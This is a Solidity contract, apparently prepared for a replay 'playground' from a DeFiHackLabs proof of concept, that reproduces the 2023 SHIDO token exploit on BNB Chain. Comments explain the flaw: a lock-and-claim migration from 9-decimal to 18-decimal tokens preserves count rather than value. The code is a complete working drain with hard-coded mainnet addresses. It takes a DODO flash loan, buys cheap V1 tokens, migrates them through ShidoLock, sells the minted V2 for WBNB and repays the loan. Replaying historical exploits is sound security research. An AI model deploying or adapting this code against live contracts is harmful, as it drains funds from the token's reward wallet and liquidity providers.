// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-SHIDO_exp2).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself, so there
// is no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit -> DPPFlashLoanCall -> swapWBNBToSHIDOInu
// -> lockTokens/claimTokens -> swapSHIDOToWBNB) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from test/SHIDO_exp2.sol:
//   - flashLoan 40e18 from DPPAdvanced
//   - swap 39e18 WBNB -> SHIDOInu (routed to AddRemoveLiquidityForFeeOnTransferTokens)
//   - withdraw 10e15 WBNB -> ETH, swap 100e15 -> SHIDOInu (to this contract)
//   - addLiquidityETH{value: 0.01 ether}(SHIDOInu, 1e9, 1, 1, this, ts+100)
//   - ShidoLock.lockTokens(); ShidoLock.claimTokens();
//   - swap all SHIDO -> WBNB (minOut 500e18, deadline ts+100)
//   - repay baseAmount WBNB to DPPAdvanced
//
// Root cause (exp2 framing): ShidoLock.claimTokens() multiplies the locked raw V1
// balance (9 decimals) by 10**9 to mint 18-decimal V2 from the reward wallet — a
// count-preserving (not value-preserving) migration. Anyone can buy cheap V1 on a
// thin pool and migrate it 1:1 into V2 sitting in a deep pool, draining the reward
// wallet and the V2/WBNB liquidity.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWBNB {
    function withdraw(uint256) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFeeFreeRouter {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IShidoLock {
    function lockTokens() external;
    function claimTokens() external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ShidoExp2Drain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant SHIDOInu = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);
    IERC20 constant SHIDO = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);
    IUniRouterV2 constant PancakeRouter = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IFeeFreeRouter constant AddRemoveLiquidityForFeeOnTransferTokens =
        IFeeFreeRouter(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IShidoLock constant ShidoLock = IShidoLock(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);
    address constant dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;

    // Step 1: flash-borrow 40 WBNB from DODO; the callback below does the drain.
    function run() external {
        IDVM(dodo).flashLoan(40 * 1e18, 0, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // Approvals (verbatim from the test).
        WBNB.approve(address(PancakeRouter), type(uint256).max);
        SHIDOInu.approve(address(AddRemoveLiquidityForFeeOnTransferTokens), type(uint256).max);
        SHIDOInu.approve(address(ShidoLock), type(uint256).max);
        SHIDO.approve(address(PancakeRouter), type(uint256).max);

        // Step 2. Swap WBNB (39 WBNB) to obtain SHIDOInu tokens (9 decimals).
        swapWBNBToSHIDOInu(39 * 1e18, address(AddRemoveLiquidityForFeeOnTransferTokens));
        IWBNB(address(WBNB)).withdraw(10 * 1e15);
        swapWBNBToSHIDOInu(100 * 1e15, address(this));

        AddRemoveLiquidityForFeeOnTransferTokens.addLiquidityETH{value: 0.01 ether}(
            address(SHIDOInu), 1e9, 1, 1, address(this), block.timestamp + 100
        );

        // Step 3. Sequentially invoke lockTokens() and claimTokens() to convert
        // SHIDOInu to standard SHIDO tokens (18 decimals).
        ShidoLock.lockTokens();
        ShidoLock.claimTokens();

        // Step 4. Swap all SHIDO tokens to WBNB.
        swapSHIDOToWBNB();

        // Step 5. Repay flashloan.
        WBNB.transfer(dodo, baseAmount);
    }

    function swapWBNBToSHIDOInu(uint256 amountIn, address to) internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHIDOInu);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 20, path, to, block.timestamp + 100
        );
    }

    function swapSHIDOToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(SHIDO);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHIDO.balanceOf(address(this)), 500 * 1e18, path, address(this), block.timestamp + 100
        );
    }

    receive() external payable {}
}
